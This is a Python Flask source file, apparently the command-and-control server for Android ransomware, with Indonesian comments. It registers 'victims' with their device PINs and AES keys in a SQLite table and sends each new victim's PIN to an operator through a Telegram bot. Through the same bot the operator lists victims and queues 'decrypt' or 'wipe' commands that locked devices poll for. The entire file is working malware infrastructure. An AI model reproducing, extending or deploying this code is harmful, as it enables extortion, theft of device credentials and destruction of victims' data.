import os
import json
import sqlite3
import threading
from datetime import datetime
from flask import Flask, request, jsonify
import requests

# ========== KONFIGURASI ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "")
PORT = int(os.environ.get("PORT", 8080))

# ========== DATABASE ==========
DB_PATH = "c2_data.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        device_id TEXT PRIMARY KEY,
        pin TEXT,
        aes_key TEXT,
        model TEXT,
        android_version TEXT,
        first_seen TEXT,
        last_active TEXT,
        progress INTEGER DEFAULT 0,
        is_locked INTEGER DEFAULT 1
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        command TEXT,
        issued_at TEXT,
        executed INTEGER DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

# ========== FLASK APP ==========
app = Flask(__name__)

# ========== FUNGSI KIRIM TELEGRAM ==========
def send_telegram(text):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        print("BOT_TOKEN or ADMIN_CHAT_ID not set")
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram error:", e)

# ========== ENDPOINTS UNTUK ANDROID ==========
@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data:
        return jsonify({"error": "no data"}), 400
    
    device_id = data.get('device_id')
    pin = data.get('pin')
    aes_key = data.get('aes_key')
    model = data.get('model')
    android_version = data.get('android_version')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO victims 
        (device_id, pin, aes_key, model, android_version, first_seen, last_active, is_locked)
        VALUES (?, ?, ?, ?, ?, ?, ?, 1)''',
        (device_id, pin, aes_key, model, android_version, now, now))
    conn.commit()
    conn.close()
    
    # Kirim notifikasi ke admin
    msg = f"🔴 *NEW VICTIM*\n\nDevice ID: `{device_id}`\nPIN: `{pin}`\nModel: {model}\nTime: {now}"
    threading.Thread(target=send_telegram, args=(msg,)).start()
    
    return jsonify({"status": "ok"})

@app.route('/status', methods=['POST'])
def status():
    data = request.get_json()
    device_id = data.get('device_id')
    progress = data.get('progress')
    is_locked = data.get('is_locked')
    
    if not device_id:
        return jsonify({"error": "device_id required"}), 400
    
    now = datetime.now().isoformat()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE victims SET last_active=?, progress=?, is_locked=?
                 WHERE device_id=?''', (now, progress, is_locked, device_id))
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route('/command/<device_id>', methods=['GET'])
def get_command(device_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT command FROM commands 
                 WHERE device_id=? AND executed=0
                 ORDER BY id ASC LIMIT 1''', (device_id,))
    row = c.fetchone()
    if row:
        command = row[0]
        c.execute('UPDATE commands SET executed=1 WHERE device_id=? AND command=?', (device_id, command))
        conn.commit()
        conn.close()
        return jsonify({"command": command})
    conn.close()
    return jsonify({"command": None})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive"})

# ========== HANDLER BOT TELEGRAM (via getUpdates polling) ==========
def bot_polling():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id+1}&timeout=30"
            resp = requests.get(url, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data['ok']:
                    for update in data['result']:
                        last_update_id = update['update_id']
                        if 'message' in update:
                            msg = update['message']
                            chat_id = msg['chat']['id']
                            # Hanya respons ke admin
                            if str(chat_id) != str(ADMIN_CHAT_ID):
                                continue
                            text = msg.get('text', '')
                            if text.startswith('/'):
                                handle_command(chat_id, text)
        except Exception as e:
            print("Bot polling error:", e)
        threading.Event().wait(1)

def handle_command(chat_id, text):
    parts = text.strip().split()
    cmd = parts[0].lower()
    
    if cmd == '/start':
        send_telegram_to_chat(chat_id, "🤖 *C2 Bot Active*\nCommands:\n/victims\n/decrypt <device_id>\n/wipe <device_id>\n/info <device_id>")
    elif cmd == '/victims':
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id, progress, is_locked FROM victims ORDER BY last_active DESC")
        rows = c.fetchall()
        conn.close()
        if not rows:
            send_telegram_to_chat(chat_id, "No victims.")
        else:
            msg = "*Victims:*\n"
            for r in rows:
                status = "🔒" if r[2] else "🔓"
                msg += f"{status} `{r[0]}` - {r[1]}%\n"
            send_telegram_to_chat(chat_id, msg)
    elif cmd == '/decrypt' and len(parts) > 1:
        device_id = parts[1]
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id FROM victims WHERE device_id=?", (device_id,))
        if c.fetchone():
            c.execute("INSERT INTO commands (device_id, command, issued_at) VALUES (?, ?, ?)",
                      (device_id, "decrypt", datetime.now().isoformat()))
            conn.commit()
            send_telegram_to_chat(chat_id, f"✅ Decrypt command sent to `{device_id}`")
        else:
            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
        conn.close()
    elif cmd == '/wipe' and len(parts) > 1:
        device_id = parts[1]
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT device_id FROM victims WHERE device_id=?", (device_id,))
        if c.fetchone():
            c.execute("INSERT INTO commands (device_id, command, issued_at) VALUES (?, ?, ?)",
                      (device_id, "wipe", datetime.now().isoformat()))
            conn.commit()
            send_telegram_to_chat(chat_id, f"⚠️ WIPE command sent to `{device_id}`")
        else:
            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
        conn.close()
    elif cmd == '/info' and len(parts) > 1:
        device_id = parts[1]
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT pin, progress, is_locked, model, last_active FROM victims WHERE device_id=?", (device_id,))
        row = c.fetchone()
        conn.close()
        if row:
            pin, prog, locked, model, last = row
            status = "Locked" if locked else "Unlocked"
            msg = f"*Device:* `{device_id}`\nPIN: `{pin}`\nProgress: {prog}%\nStatus: {status}\nModel: {model}\nLast: {last[:16]}"
            send_telegram_to_chat(chat_id, msg)
        else:
            send_telegram_to_chat(chat_id, f"❌ Device `{device_id}` not found")
    else:
        send_telegram_to_chat(chat_id, "Unknown command. Use /start")

def send_telegram_to_chat(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Send to chat error:", e)

# ========== RUN FLASK + BOT POLLING ==========
def run_flask():
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    # Start Flask di thread terpisah
    t_flask = threading.Thread(target=run_flask)
    t_flask.daemon = True
    t_flask.start()
    # Start bot polling di thread utama
    if BOT_TOKEN and ADMIN_CHAT_ID:
        bot_polling()
    else:
        print("BOT_TOKEN or ADMIN_CHAT_ID missing, bot not started")
        # Tetap jalankan Flask saja
        run_flask()
